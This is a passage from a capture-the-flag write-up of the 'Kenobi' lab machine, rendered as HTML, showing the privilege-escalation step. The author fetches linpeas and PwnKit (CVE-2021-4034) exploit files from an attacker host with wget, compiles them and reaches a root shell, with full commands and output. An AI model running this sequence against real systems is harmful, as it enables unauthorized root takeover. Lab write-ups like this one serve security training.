</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> wget http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>linpeas<span style=color:#f92672>.</span>sh
</span></span><span style=display:flex><span><span style=color:#f92672>--</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>03</span><span style=color:#f92672>--</span>  http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>linpeas<span style=color:#f92672>.</span>sh
</span></span><span style=display:flex><span>Connecting to <span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>80.</span><span style=color:#f92672>..</span> connected<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>HTTP request sent, awaiting response<span style=color:#f92672>...</span> <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>847825</span> (<span style=color:#ae81ff>828</span>K) [text<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>sh]
</span></span><span style=display:flex><span>Saving to: <span style=color:#960050;background-color:#1e0010>‘</span>linpeas<span style=color:#f92672>.</span>sh<span style=color:#960050;background-color:#1e0010>’</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>linpeas<span style=color:#f92672>.</span>sh                                     <span style=color:#ae81ff>100</span><span style=color:#f92672>%</span>[<span style=color:#f92672>===================================================================================================&gt;</span>] <span style=color:#ae81ff>827.95</span>K  <span style=color:#ae81ff>1.13</span>MB<span style=color:#f92672>/</span>s    <span style=color:#f92672>in</span> <span style=color:#ae81ff>0.7</span>s    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>04</span> (<span style=color:#ae81ff>1.13</span> MB<span style=color:#f92672>/</span>s) <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>‘</span>linpeas<span style=color:#f92672>.</span>sh<span style=color:#960050;background-color:#1e0010>’</span> saved [<span style=color:#ae81ff>847825</span><span style=color:#f92672>/</span><span style=color:#ae81ff>847825</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> chmod <span style=color:#f92672>+</span>x linpeas<span style=color:#f92672>.</span>sh 
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#f92672>./</span>linpeas<span style=color:#f92672>.</span>sh 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                            <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>                    <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄</span>             <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>             <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄</span>      <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>  <span style=color:#960050;background-color:#1e0010>▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄</span>     <span style=color:#960050;background-color:#1e0010>▄</span> <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄</span>    <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>       <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄</span>          <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄</span>               <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄</span> <span style=color:#960050;background-color:#1e0010>▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄</span>              <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄</span>                 <span style=color:#960050;background-color:#1e0010>▄▄▄▄</span> 
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄</span>                  <span style=color:#960050;background-color:#1e0010>▄▄▄</span> <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>                  <span style=color:#960050;background-color:#1e0010>▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄</span>                <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄</span>                  <span style=color:#960050;background-color:#1e0010>▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄</span>            <span style=color:#960050;background-color:#1e0010>▄▄</span> <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>   <span style=color:#960050;background-color:#1e0010>▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄</span>      <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>                                <span style=color:#960050;background-color:#1e0010>▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>  <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>                       <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄</span>     <span style=color:#960050;background-color:#1e0010>▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄</span>   <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>                       <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>      <span style=color:#960050;background-color:#1e0010>▄</span> <span style=color:#960050;background-color:#1e0010>▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>  <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>        <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄</span>        <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>     <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄</span>  <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄</span>      <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄</span>      <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄</span>   <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄</span> 
</span></span><span style=display:flex><span>          <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>        <span style=color:#960050;background-color:#1e0010>▄</span>          <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> 
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄</span>                       <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄</span>                         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>         <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>            <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span style=display:flex><span>          <span style=color:#960050;background-color:#1e0010>▀▀▄▄▄</span>   <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▀▀▀▀▀▀</span>
</span></span><span style=display:flex><span>               <span style=color:#960050;background-color:#1e0010>▀▀▀▄▄▄▄▄</span>      <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▄▄▄▄</span>  <span style=color:#960050;background-color:#1e0010>▄▄▄▄▄▄▀▀</span>
</span></span><span style=display:flex><span>                     <span style=color:#960050;background-color:#1e0010>▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>/---------------------------------------------------------------------------------</span>\
</span></span><span style=display:flex><span>    <span style=color:#f92672>|</span>                             Do you like PEASS<span style=color:#960050;background-color:#1e0010>?</span>                                  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>|---------------------------------------------------------------------------------|</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>|</span>         Get the latest version    :     https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>sponsors<span style=color:#f92672>/</span>carlospolop <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>|</span>         Follow on Twitter         :     <span style=color:#a6e22e>@hacktricks_live</span>                        <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>|</span>         Respect on HTB            :     SirBroccoli                             <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>|---------------------------------------------------------------------------------|</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>|</span>                                 Thank you<span style=color:#960050;background-color:#1e0010>!</span>                                      <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    \<span style=color:#f92672>---------------------------------------------------------------------------------/</span>
</span></span><span style=display:flex><span>          linpeas<span style=color:#f92672>-</span>ng by carlospolop
</span></span></code></pre></div><p>We can see that the target machine is vulnerable to <code>CVE-2021-4034</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>[<span style=color:#f92672>+</span>] [CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4034</span>] PwnKit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Details: https:<span style=color:#f92672>//</span>www<span style=color:#f92672>.</span>qualys<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span><span style=color:#ae81ff>2022</span><span style=color:#f92672>/</span><span style=color:#ae81ff>01</span><span style=color:#f92672>/</span><span style=color:#ae81ff>25</span><span style=color:#f92672>/</span>cve<span style=color:#f92672>-</span><span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4034</span><span style=color:#f92672>/</span>pwnkit<span style=color:#f92672>.</span>txt
</span></span><span style=display:flex><span>   Exposure: probable
</span></span><span style=display:flex><span>   Tags: [ ubuntu<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span><span style=color:#f92672>|</span><span style=color:#ae81ff>11</span><span style=color:#f92672>|</span><span style=color:#ae81ff>12</span><span style=color:#f92672>|</span><span style=color:#ae81ff>13</span><span style=color:#f92672>|</span><span style=color:#ae81ff>14</span><span style=color:#f92672>|</span><span style=color:#ae81ff>15</span><span style=color:#f92672>|</span><span style=color:#ae81ff>16</span><span style=color:#f92672>|</span><span style=color:#ae81ff>17</span><span style=color:#f92672>|</span><span style=color:#ae81ff>18</span><span style=color:#f92672>|</span><span style=color:#ae81ff>19</span><span style=color:#f92672>|</span><span style=color:#ae81ff>20</span><span style=color:#f92672>|</span><span style=color:#ae81ff>21</span> ],debian<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span><span style=color:#f92672>|</span><span style=color:#ae81ff>8</span><span style=color:#f92672>|</span><span style=color:#ae81ff>9</span><span style=color:#f92672>|</span><span style=color:#ae81ff>10</span><span style=color:#f92672>|</span><span style=color:#ae81ff>11</span>,fedora,manjaro
</span></span><span style=display:flex><span>   Download URL: https:<span style=color:#f92672>//</span>codeload<span style=color:#f92672>.</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>berdav<span style=color:#f92672>/</span>CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4034</span><span style=color:#f92672>/</span>zip<span style=color:#f92672>/</span>main
</span></span></code></pre></div><p>We clone the repository to our machine.</p><blockquote><p><a href=https://github.com/ryaagard/CVE-2021-4034.git>https://github.com/ryaagard/CVE-2021-4034.git</a></p></blockquote><p>Start the python server again to server the files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server <span style=color:#ae81ff>1111</span>
</span></span></code></pre></div><p>On target machine create a folder and download all the files to the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> mkdir exploit
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> cd exploit<span style=color:#f92672>/</span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> wget http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c
</span></span><span style=display:flex><span><span style=color:#f92672>--</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>30</span><span style=color:#f92672>--</span>  http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c
</span></span><span style=display:flex><span>Connecting to <span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>80.</span><span style=color:#f92672>..</span> connected<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>HTTP request sent, awaiting response<span style=color:#f92672>...</span> <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>183</span> [text<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>csrc]
</span></span><span style=display:flex><span>Saving to: <span style=color:#960050;background-color:#1e0010>‘</span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c<span style=color:#960050;background-color:#1e0010>’</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c                                      <span style=color:#ae81ff>100</span><span style=color:#f92672>%</span>[<span style=color:#f92672>===================================================================================================&gt;</span>]     <span style=color:#ae81ff>183</span>  <span style=color:#f92672>--.-</span>KB<span style=color:#f92672>/</span>s    <span style=color:#f92672>in</span> <span style=color:#ae81ff>0</span>s      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>30</span> (<span style=color:#ae81ff>47.8</span> MB<span style=color:#f92672>/</span>s) <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>‘</span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c<span style=color:#960050;background-color:#1e0010>’</span> saved [<span style=color:#ae81ff>183</span><span style=color:#f92672>/</span><span style=color:#ae81ff>183</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> wget http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>exploit<span style=color:#f92672>.</span>c
</span></span><span style=display:flex><span><span style=color:#f92672>--</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>46</span><span style=color:#f92672>--</span>  http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>exploit<span style=color:#f92672>.</span>c
</span></span><span style=display:flex><span>Connecting to <span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>80.</span><span style=color:#f92672>..</span> connected<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>HTTP request sent, awaiting response<span style=color:#f92672>...</span> <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>614</span> [text<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>csrc]
</span></span><span style=display:flex><span>Saving to: <span style=color:#960050;background-color:#1e0010>‘</span>exploit<span style=color:#f92672>.</span>c<span style=color:#960050;background-color:#1e0010>’</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exploit<span style=color:#f92672>.</span>c                                      <span style=color:#ae81ff>100</span><span style=color:#f92672>%</span>[<span style=color:#f92672>===================================================================================================&gt;</span>]     <span style=color:#ae81ff>614</span>  <span style=color:#f92672>--.-</span>KB<span style=color:#f92672>/</span>s    <span style=color:#f92672>in</span> <span style=color:#ae81ff>0</span>s      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>47</span> (<span style=color:#ae81ff>139</span> MB<span style=color:#f92672>/</span>s) <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>‘</span>exploit<span style=color:#f92672>.</span>c<span style=color:#960050;background-color:#1e0010>’</span> saved [<span style=color:#ae81ff>614</span><span style=color:#f92672>/</span><span style=color:#ae81ff>614</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> wget http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>Makefile
</span></span><span style=display:flex><span><span style=color:#f92672>--</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>29</span>:<span style=color:#ae81ff>03</span><span style=color:#f92672>--</span>  http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.6.10.164</span><span style=color:#f92672>/</span>Makefile
</span></span><span style=display:flex><span>Connecting to <span style=color:#ae81ff>10.6.10.164</span>:<span style=color:#ae81ff>80.</span><span style=color:#f92672>..</span> connected<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>HTTP request sent, awaiting response<span style=color:#f92672>...</span> <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>148</span> [application<span style=color:#f92672>/</span>octet<span style=color:#f92672>-</span>stream]
</span></span><span style=display:flex><span>Saving to: <span style=color:#960050;background-color:#1e0010>‘</span>Makefile<span style=color:#960050;background-color:#1e0010>’</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Makefile                                       <span style=color:#ae81ff>100</span><span style=color:#f92672>%</span>[<span style=color:#f92672>===================================================================================================&gt;</span>]     <span style=color:#ae81ff>148</span>  <span style=color:#f92672>--.-</span>KB<span style=color:#f92672>/</span>s    <span style=color:#f92672>in</span> <span style=color:#ae81ff>0</span>s      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>29</span>:<span style=color:#ae81ff>04</span> (<span style=color:#ae81ff>31.5</span> MB<span style=color:#f92672>/</span>s) <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>‘</span>Makefile<span style=color:#960050;background-color:#1e0010>’</span> saved [<span style=color:#ae81ff>148</span><span style=color:#f92672>/</span><span style=color:#ae81ff>148</span>]
</span></span></code></pre></div><p>Run the make file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> make
</span></span><span style=display:flex><span>gcc <span style=color:#f92672>-</span>shared <span style=color:#f92672>-</span>o evil<span style=color:#f92672>.</span>so <span style=color:#f92672>-</span>fPIC evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c
</span></span><span style=display:flex><span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c: In function <span style=color:#960050;background-color:#1e0010>‘</span>gconv_init<span style=color:#960050;background-color:#1e0010>’</span>:
</span></span><span style=display:flex><span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c:<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>5</span>: warning: implicit declaration of function <span style=color:#960050;background-color:#1e0010>‘</span>setgroups<span style=color:#960050;background-color:#1e0010>’</span> [<span style=color:#f92672>-</span>Wimplicit<span style=color:#f92672>-</span>function<span style=color:#f92672>-</span>declaration]
</span></span><span style=display:flex><span>     setgroups(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>     <span style=color:#f92672>^</span>
</span></span><span style=display:flex><span>evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c:<span style=color:#ae81ff>12</span>:<span style=color:#ae81ff>5</span>: warning: null argument where non<span style=color:#f92672>-</span>null required (argument <span style=color:#ae81ff>2</span>) [<span style=color:#f92672>-</span>Wnonnull]
</span></span><span style=display:flex><span>     execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, NULL, NULL);
</span></span><span style=display:flex><span>     <span style=color:#f92672>^</span>
</span></span><span style=display:flex><span>gcc exploit<span style=color:#f92672>.</span>c <span style=color:#f92672>-</span>o exploit
</span></span><span style=display:flex><span>exploit<span style=color:#f92672>.</span>c: In function <span style=color:#960050;background-color:#1e0010>‘</span>main<span style=color:#960050;background-color:#1e0010>’</span>:
</span></span><span style=display:flex><span>exploit<span style=color:#f92672>.</span>c:<span style=color:#ae81ff>25</span>:<span style=color:#ae81ff>5</span>: warning: implicit declaration of function <span style=color:#960050;background-color:#1e0010>‘</span>execve<span style=color:#960050;background-color:#1e0010>’</span> [<span style=color:#f92672>-</span>Wimplicit<span style=color:#f92672>-</span>function<span style=color:#f92672>-</span>declaration]
</span></span><span style=display:flex><span>     execve(BIN, argv, envp);
</span></span><span style=display:flex><span>     <span style=color:#f92672>^</span>
</span></span></code></pre></div><p>Execute the binary.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> ls
</span></span><span style=display:flex><span>evil<span style=color:#f92672>.</span>so  evil<span style=color:#f92672>-</span>so<span style=color:#f92672>.</span>c  exploit  exploit<span style=color:#f92672>.</span>c  Makefile
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#f92672>./</span>e
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>bash: <span style=color:#f92672>./</span>e: No such file <span style=color:#f92672>or</span> directory
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>exploit<span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#f92672>./</span>exploit 
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>(root) gid<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>(root) groups<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>(root)
</span></span></code></pre></div><p>We are root!!!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#approach-1>Approach 1</a></li><li><a href=#approach-2>Approach 2</a></li></ul></li></ul></nav></div></aside></main></body></html>